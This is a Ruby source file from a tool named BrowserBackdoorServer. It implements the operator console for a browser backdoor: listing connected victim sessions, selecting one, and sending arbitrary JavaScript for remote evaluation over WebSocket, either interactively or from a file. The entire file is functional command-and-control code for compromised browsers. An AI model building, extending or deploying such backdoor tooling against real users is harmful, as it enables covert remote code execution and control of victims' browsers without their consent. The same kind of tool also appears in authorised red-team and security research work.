#
# Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

require_relative 'printcolor'
require_relative 'websocket'

module Bbs

module Command
    def Command.infoCommand(info_commands, selected, wsList)
        info_commands.each {|_key, cmd|
            begin
                Bbs::WebSocket.sendCommand(cmd, wsList[selected])
            rescue => e
                 puts e.message
                 Bbs::PrintColor.print_error("Error sending command. Selected session may no longer exist.")
                 break
            end
        }
    end

    def Command.sessionsCommand(selected, wsList)
        if wsList.length < 1
            puts "No sessions"
            return
        end
        puts "The session ID with astericks is the currently targeted session."
        puts "ID : Identifier"
        wsList.each_with_index {|val, index|
            if index == selected
                current = "*" + index.to_s + "*" + " : " + val.to_s
            else
                current = index.to_s + " : " + val.to_s
            end
            puts current
        }
    end

    def Command.execCommandLoop(selected, wsList)
        puts "Commands are sent in an an anonymous function and the eval'd result is returned."
        puts "Enter the command to send (exit when done)."
        while cmdSend = Readline::readline("\ncmd ##{selected} > ".colorize(:magenta), true)
            if !Bbs::WebSocket.validSession?(selected, wsList)
                return
            end
            break if cmdSend == "exit"
            next if cmdSend == "" || cmdSend == nil
            begin
                Bbs::WebSocket.sendCommand(cmdSend, wsList[selected])
            rescue => e
                Bbs::PrintColor.print_error("Error sending command: " + e.message)
            end
        end
    end

    def Command.execCommand(selected, wsList, cmdIn)
        if cmdIn.length < 2
            execCommandLoop(selected, wsList)
        else
            begin
                file = File.open(cmdIn[1], "r")
                cmdSend = file.read
                file.close
            rescue => e
                Bbs::PrintColor.print_error("Error opening file to execute: " + e.message)
                return
            end
            Bbs::WebSocket.sendCommand(cmdSend, wsList[selected])
        end
    end

    def Command.useCommand(wss, cmdIn)
        if cmdIn.length < 2
            Bbs::PrintColor.print_error("Usage is use SESSION_ID. Type help for help.")
            return
        end
        selectIn = cmdIn[1].to_i
        if selectIn > wss.getWsList().length - 1
            Bbs::PrintColor.print_error("Session does not exist.")
            return
        end
        if Bbs::WebSocket::validSession?(selectIn, wss.getWsList())
            wss.setSelected(selectIn)
        else
            return
        end
        Bbs::PrintColor.print_notice("Selected session is now " + wss.getSelected().to_s + ".")
    end

    def Command.helpCommand(commands)
        commands.each do |key, array|
            print key
            print " --> "
            puts array
            puts
        end
    end

    def Command.getCertCommand()
        if File.file?("./getCert.sh")
            system("./getCert.sh")
            return
        end
        print "Enter the location of getCert.sh: "
        path = gets.chomp
        if File.file?(path)
            system("./" + path)
        else
            Bbs::PrintColor.print_error(path + " does not exist")
        end
    end
end

end

